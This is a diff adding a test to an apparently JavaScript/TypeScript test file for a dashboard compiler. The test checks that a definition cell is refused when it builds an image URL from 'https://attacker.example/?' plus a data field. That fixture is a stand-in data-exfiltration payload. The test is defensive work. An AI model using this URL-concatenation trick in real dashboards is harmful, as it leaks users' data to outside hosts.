@@ -276,6 +276,15 @@ run: open_src -> { aggregate: c }
          ).rejects.toBeInstanceOf(CompileRefusedError);
       });
 
+      it("refuses a definition cell that turns a value into a URL with a render tag", async () => {
+         await expect(
+            compile(
+               `## artifact { kind=dashboard tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension: # image\n    pic is concat('https://attacker.example/?', region)\n  view: v is { group_by: pic }\n}\n`,
+               { ROLE: "analyst" },
+            ),
+         ).rejects.toBeInstanceOf(CompileRefusedError);
+      });
+
       it("leaves an ordinary tile's givens exactly as they were", async () => {
          const result = await compile(
             `## artifact { kind=dashboard tiles=["open_src -> v"] }\n`,
